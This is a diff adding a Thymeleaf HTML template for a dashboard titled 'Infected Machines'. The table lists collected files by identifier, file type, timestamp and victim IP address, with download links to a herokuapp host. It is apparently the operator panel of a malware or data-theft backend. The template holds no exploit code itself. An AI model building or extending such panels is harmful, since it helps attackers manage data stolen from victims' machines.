@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <title>Dashboard</title>
+    <link th:href="@{/style.css}" rel="stylesheet" />
+</head>
+<body>
+<a th:href="@{/logout}" class="lButton"> logout</a>
+<div class="title">Infected Machines</div>
+<table>
+    <thead>
+    <tr>
+        <th>Identifier</th>
+        <th>File Type</th>
+        <th>Date Time</th>
+        <th>Remote IP Address</th>
+        <th>Download</th>
+    </tr>
+    </thead>
+    <tbody>
+    <tr th:each="attachment : ${attachments}">
+        <td th:text="${attachment.id}">NONE</td>
+        <td th:text="${attachment.fileType}">NONE</td>
+        <td th:text="${#temporals.format(attachment.date, 'dd.MM.yyyy HH:mm:ss')}">NONE</td>
+        <td th:text="${attachment.ipAddress}">NONE</td>
+        <td>
+            <a title="Download Data" th:href="'https://gabup.herokuapp.com/download/'+${attachment.id}" class="deleteTaskBtn">Download</a>
+        </td>
+    </tr>
+    </tbody>
+</table>
+</body>
+</html>
